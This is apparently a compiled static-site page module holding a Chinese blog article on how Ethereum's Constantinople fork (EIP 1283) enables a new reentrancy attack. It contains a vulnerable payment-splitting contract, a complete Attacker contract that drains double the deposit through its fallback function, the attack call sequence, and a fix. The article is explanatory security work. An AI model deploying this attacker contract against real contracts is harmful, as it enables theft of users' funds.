import{o as n,c as s,f as a,b as p,d as t,e}from"./app.f7f738b8.js";const o='{"title":"君士坦丁堡分叉引起的安全问题","description":"","frontmatter":{"title":"君士坦丁堡分叉引起的安全问题","date":"2019-01-18T14:42:10.000Z","draft":false,"markup":"mmark"},"headers":[{"level":2,"title":"一. 什么是君士坦丁堡分叉","slug":"一-什么是君士坦丁堡分叉"},{"level":2,"title":"二. 一个重入合约","slug":"二-一个重入合约"},{"level":2,"title":"三. 一份尝试攻击的合约","slug":"三-一份尝试攻击的合约"},{"level":2,"title":"四. 组合调用","slug":"四-组合调用"},{"level":3,"title":"分叉之前","slug":"分叉之前"},{"level":3,"title":"分叉之后","slug":"分叉之后"},{"level":3,"title":"调用顺序","slug":"调用顺序"},{"level":2,"title":"五. 如何解决","slug":"五-如何解决"}],"relativePath":"ethereum/君士坦丁堡分叉引起的安全问题.md","lastUpdated":1561553438000}',c={},l=p("h1",{id:"君士坦丁堡分叉引起的安全问题"},[p("a",{class:"header-anchor",href:"#君士坦丁堡分叉引起的安全问题","aria-hidden":"true"},"#"),t(" 君士坦丁堡分叉引起的安全问题")],-1),u=e('<ul><li><a href="#%E5%90%9B%E5%A3%AB%E5%9D%A6%E4%B8%81%E5%A0%A1%E5%88%86%E5%8F%89%E5%BC%95%E8%B5%B7%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98">君士坦丁堡分叉引起的安全问题</a><ul><li><a href="#%E4%B8%80-%E4%BB%80%E4%B9%88%E6%98%AF%E5%90%9B%E5%A3%AB%E5%9D%A6%E4%B8%81%E5%A0%A1%E5%88%86%E5%8F%89">一. 什么是君士坦丁堡分叉</a></li><li><a href="#%E4%BA%8C-%E4%B8%80%E4%B8%AA%E9%87%8D%E5%85%A5%E5%90%88%E7%BA%A6">二. 一个重入合约</a></li><li><a href="#%E4%B8%89-%E4%B8%80%E4%BB%BD%E5%B0%9D%E8%AF%95%E6%94%BB%E5%87%BB%E7%9A%84%E5%90%88%E7%BA%A6">三. 一份尝试攻击的合约</a></li><li><a href="#%E5%9B%9B-%E7%BB%84%E5%90%88%E8%B0%83%E7%94%A8">四. 组合调用</a><ul><li><a href="#%E5%88%86%E5%8F%89%E4%B9%8B%E5%89%8D">分叉之前</a></li><li><a href="#%E5%88%86%E5%8F%89%E4%B9%8B%E5%90%8E">分叉之后</a></li><li><a href="#%E8%B0%83%E7%94%A8%E9%A1%BA%E5%BA%8F">调用顺序</a></li></ul></li><li><a href="#%E4%BA%94-%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3">五. 如何解决</a></li></ul></li></ul>',1),i=e('<h2 id="一-什么是君士坦丁堡分叉"><a class="header-anchor" href="#一-什么是君士坦丁堡分叉" aria-hidden="true">#</a> 一. 什么是君士坦丁堡分叉</h2><p>君士坦丁堡是最近以太坊的大事,主要做了一下改进</p><ul><li>EIP 145：由两位以太坊开发人员Alex Beregszaszi 和 Pawel Bylica编写的技术升级，EIP 145详细描述了一种更有效的以太坊信息处理方案，其称为逐位移动（bitwise shifting）；</li><li>EIP 1052:由以太坊core开发人员Nick Johnson和Bylica所撰写，1052提供了一种优化以太坊网络大规模代码执行的方法。</li><li>EIP 1283：由Johnson撰写，其基于EIP 1087，这一提议主要了引入了一种针对数据存储更改更公平的定价方法，这可以让智能合约开发者受益。</li><li>EIP 1014：由以太坊创始人Vitalik Buterin亲自创建，此升级的目的是更好地促进基于状态通道和链外（off-chain）交易的扩容解决方案。</li><li>EIP 1234：由以太坊主要客户端 Parity发布经理 Afri Schoedon所倡导，这也是以太坊此次升级中最具争议的部分，它会使以太坊网络的区块奖励从3ETH减少到2ETH，此外还会延迟难度炸弹12个月的时间。</li></ul><p>其中<a href="https://eips.ethereum.org/EIPS/eip-1283" target="_blank" rel="noopener noreferrer">EIP 1283</a> 最重要的改动就是对于修改合约内容更加便宜了,原来修改非0内容的地址需要5000gas,现在只需要200gas. 具体意思就是</p><div class="language-sol line-numbers-mode"><pre><code><span class="token comment">//第一次写入</span>\nContract<span class="token punctuation">.</span>A<span class="token operator">=</span><span class="token number">300</span> <span class="token comment">//花费20000gas</span>\n<span class="token comment">//第二次写入</span>\nContract<span class="token punctuation">.</span>A<span class="token operator">=</span><span class="token number">500</span> <span class="token comment">//花费5000gas,如果是君士坦丁堡分叉以后只有200gas.</span>\n</code></pre><div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>这对于DAPP而言肯定是好事,降低了DAPP的成本.但是\b意外却引入了安全风险.</p><h2 id="二-一个重入合约"><a class="header-anchor" href="#二-一个重入合约" aria-hidden="true">#</a> 二. 一个重入合约</h2><p>一份双方协调分成的合约,简化起见,里面很多安全问题没检查,比如updateSplit应该只能参与双方更新.</p><div class="language-sol line-numbers-mode"><pre><code><span class="token comment">//PaymentSharer.sol</span>\n<span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.5.0</span><span class="token punctuation">;</span>\n\n<span class="token keyword">contract</span> <span class="token class-name">PaymentSharer</span> <span class="token punctuation">{</span>\n  <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">uint</span> <span class="token operator">=&gt;</span> <span class="token builtin">uint</span><span class="token punctuation">)</span> splits<span class="token punctuation">;</span>\n  <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">uint</span> <span class="token operator">=&gt;</span> <span class="token builtin">uint</span><span class="token punctuation">)</span> deposits<span class="token punctuation">;</span>\n  <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">uint</span> <span class="token operator">=&gt;</span> <span class="token builtin">address</span> <span class="token keyword">payable</span><span class="token punctuation">)</span> first<span class="token punctuation">;</span>\n  <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">uint</span> <span class="token operator">=&gt;</span> <span class="token builtin">address</span> <span class="token keyword">payable</span><span class="token punctuation">)</span> second<span class="token punctuation">;</span>\n\n  <span class="token keyword">function</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token builtin">uint</span> id<span class="token punctuation">,</span> <span class="token builtin">address</span> <span class="token keyword">payable</span> _first<span class="token punctuation">,</span> <span class="token builtin">address</span> <span class="token keyword">payable</span> _second<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>\n    <span class="token keyword">require</span><span class="token punctuation">(</span>first<span class="token punctuation">[</span>id<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> second<span class="token punctuation">[</span>id<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n    <span class="token keyword">require</span><span class="token punctuation">(</span>first<span class="token punctuation">[</span>id<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> second<span class="token punctuation">[</span>id<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n    first<span class="token punctuation">[</span>id<span class="token punctuation">]</span> <span class="token operator">=</span> _first<span class="token punctuation">;</span>\n    second<span class="token punctuation">[</span>id<span class="token punctuation">]</span> <span class="token operator">=</span> _second<span class="token punctuation">;</span>\n  <span class="token punctuation">}</span>\n\n  <span class="token keyword">function</span> <span class="token function">deposit</span><span class="token punctuation">(</span><span class="token builtin">uint</span> id<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">payable</span> <span class="token punctuation">{</span>\n    deposits<span class="token punctuation">[</span>id<span class="token punctuation">]</span> <span class="token operator">+=</span> msg<span class="token punctuation">.</span>value<span class="token punctuation">;</span>\n  <span class="token punctuation">}</span>\n\n  <span class="token keyword">function</span> <span class="token function">updateSplit</span><span class="token punctuation">(</span><span class="token builtin">uint</span> id<span class="token punctuation">,</span> <span class="token builtin">uint</span> split<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>\n    <span class="token keyword">require</span><span class="token punctuation">(</span>split <span class="token operator">&lt;=</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n    splits<span class="token punctuation">[</span>id<span class="token punctuation">]</span> <span class="token operator">=</span> split<span class="token punctuation">;</span>\n  <span class="token punctuation">}</span>\n\n  <span class="token keyword">function</span> <span class="token function">splitFunds</span><span class="token punctuation">(</span><span class="token builtin">uint</span> id<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>\n    <span class="token comment">// Here would be: </span>\n    <span class="token comment">// Signatures that both parties agree with this split</span>\n\n    <span class="token comment">// Split</span>\n    <span class="token builtin">address</span> <span class="token keyword">payable</span> a <span class="token operator">=</span> first<span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token punctuation">;</span>\n    <span class="token builtin">address</span> <span class="token keyword">payable</span> b <span class="token operator">=</span> second<span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token punctuation">;</span>\n    <span class="token builtin">uint</span> depo <span class="token operator">=</span> deposits<span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token punctuation">;</span>\n    deposits<span class="token punctuation">[</span>id<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>\n     \n    a<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span>depo <span class="token operator">*</span> splits<span class="token punctuation">[</span>id<span class="token punctuation">]</span> <span class="token operator">/</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//transfer 给2100 gas执行事务</span>\n    b<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span>depo <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">100</span> <span class="token operator">-</span> splits<span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n  <span class="token punctuation">}</span>\n<span class="token punctuation">}</span>\n</code></pre><div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br></div></div><p>双方协商一致,调用updateSplit,定下各自应得多少比例.然后就可以调用splitFunds,分别拿走各自的ether. 这在君士坦丁堡分叉之前,是非常安全的.</p><h2 id="三-一份尝试攻击的合约"><a class="header-anchor" href="#三-一份尝试攻击的合约" aria-hidden="true">#</a> 三. 一份尝试攻击的合约</h2><div class="language-solidity line-numbers-mode"><pre><code><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.5.0</span><span class="token punctuation">;</span>\n\n<span class="token keyword">import</span> <span class="token string">&quot;./PaymentSharer.sol&quot;</span><span class="token punctuation">;</span>\n\n<span class="token keyword">contract</span> <span class="token class-name">Attacker</span> <span class="token punctuation">{</span>\n  <span class="token builtin">address</span> <span class="token keyword">private</span> victim<span class="token punctuation">;</span>\n  <span class="token builtin">address</span> <span class="token keyword">payable</span> owner<span class="token punctuation">;</span>\n\n  <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>\n    owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>\n  <span class="token punctuation">}</span>\n\n  <span class="token keyword">function</span> <span class="token function">attack</span><span class="token punctuation">(</span><span class="token builtin">address</span> a<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token punctuation">{</span>\n    victim <span class="token operator">=</span> a<span class="token punctuation">;</span>\n    PaymentSharer x <span class="token operator">=</span> <span class="token function">PaymentSharer</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>\n    x<span class="token punctuation">.</span><span class="token function">updateSplit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n    x<span class="token punctuation">.</span><span class="token function">splitFunds</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n  <span class="token punctuation">}</span>\n\n  <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">payable</span> <span class="token keyword">external</span> <span class="token punctuation">{</span>\n    PaymentSharer x <span class="token operator">=</span> <span class="token function">PaymentSharer</span><span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">;</span>\n    x<span class="token punctuation">.</span><span class="token function">updateSplit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//修改split,这样下b.transfer就不再是transfer 0,达到双倍收益.</span>\n  <span class="token punctuation">}</span>\n  <span class="token comment">//从合约中拿走全部ether</span>\n  <span class="token keyword">function</span> <span class="token function">drain</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token punctuation">{</span>\n    owner<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span>balance<span class="token punctuation">)</span><span class="token punctuation">;</span>\n  <span class="token punctuation">}</span>\n<span class="token punctuation">}</span>\n</code></pre><div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br></div></div><h2 id="四-组合调用"><a class="header-anchor" href="#四-组合调用" aria-hidden="true">#</a> 四. 组合调用</h2><ul><li><ol><li>PaymentSharer.init(0,Attacker,anotherAddressOfAttacker)</li></ol></li><li><ol start="2"><li>PaymentSharer.deposit(0) value=1ether</li></ol></li><li><ol start="3"><li>Attacker.attack(PaymentSharer)</li></ol></li></ul><p>最关键的是第三步的调用顺序: attack--&gt;updateSplit--&gt;attack---&gt;splitFunds(a全得,b没有)---&gt;a.transfer---&gt;Attacker&#39;s fallback---&gt;updateSplit(a没有,b全得)--&gt;b.transfer</p><p>最终a,b(Attacker和anotherAddressOfAttacker)各拿了一份完整的是后入,而不是预想的只有\b拿走全部.</p><h3 id="分叉之前"><a class="header-anchor" href="#分叉之前" aria-hidden="true">#</a> 分叉之前</h3><p>合约中调用transfer函数的gas是固定的,只能是2300,无法改动. 而Attacker&#39;s fallback 函数中\b调用updateSplit, 其中 <code>splits[id] = split;</code>这一句话就会消耗5000gas,\b因此attack这个Tx会失败.</p><h3 id="分叉之后"><a class="header-anchor" href="#分叉之后" aria-hidden="true">#</a> 分叉之后</h3><p><code>splits[id] = split;</code>只会消耗gas200,因此有足够的gas来执行updateSplit, 所以a.transfer会成功,然后b.transfer自然也会成功.</p><h3 id="调用顺序"><a class="header-anchor" href="#调用顺序" aria-hidden="true">#</a> 调用顺序</h3><p><img alt="" data-src="https://img2018.cnblogs.com/blog/124391/201901/124391-20190118223636042-2098560701.png" loading="lazy" class="lazy"></p><h2 id="五-如何解决"><a class="header-anchor" href="#五-如何解决" aria-hidden="true">#</a> 五. 如何解决</h2><p>针对这个问题解决起来非常简单.下面就是一种修正方法.</p><div class="language-sol line-numbers-mode"><pre><code><span class="token keyword">function</span> <span class="token function">splitFunds</span><span class="token punctuation">(</span><span class="token builtin">uint</span> id<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>\n    <span class="token comment">// Here would be: </span>\n    <span class="token comment">// Signatures that both parties agree with this split</span>\n\n    <span class="token comment">// Split</span>\n    <span class="token builtin">address</span> <span class="token keyword">payable</span> a <span class="token operator">=</span> first<span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token punctuation">;</span>\n    <span class="token builtin">address</span> <span class="token keyword">payable</span> b <span class="token operator">=</span> second<span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token punctuation">;</span>\n    <span class="token builtin">uint</span> depo <span class="token operator">=</span> deposits<span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token punctuation">;</span>\n    deposits<span class="token punctuation">[</span>id<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>\n    <span class="token builtin">uint</span> s<span class="token operator">=</span>splits<span class="token punctuation">[</span>id<span class="token punctuation">]</span><span class="token punctuation">;</span>\n    a<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span>depo <span class="token operator">*</span> s <span class="token operator">/</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//transfer 给2100 gas执行事务</span>\n    b<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span>depo <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">100</span> <span class="token operator">-</span> s<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n  <span class="token punctuation">}</span>\n</code></pre><div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><p>这样就算是Attacker有了重入的机会,可以执行代码,也不会有任何额外收益. 应该说合约的设计者已经考虑到a.transfer的重入问题,先修改了deposits[id],而不是\b放在transfer之后,但是仍然百密一疏.</p><p><strong>合约一旦发布就无法修改,但是EVM规则却可以通过分叉修改</strong>,可以解决以后的问题,但是却不能修复已经发布的合约.</p><p>本来参考了一下文章 <a href="https://medium.com/chainsecurity/constantinople-enables-new-reentrancy-attack-ace4088297d9" target="_blank" rel="noopener noreferrer">Constantinople enables new Reentrancy Attack</a></p>',28);c.render=function(p,t,e,o,c,r){return n(),s("div",null,[l,a(' @import "[TOC]" {cmd="toc" depthFrom=1 depthTo=6 orderedList=false} '),a(" code_chunk_output "),u,a(" /code_chunk_output "),i])};export{o as __pageData,c as default};
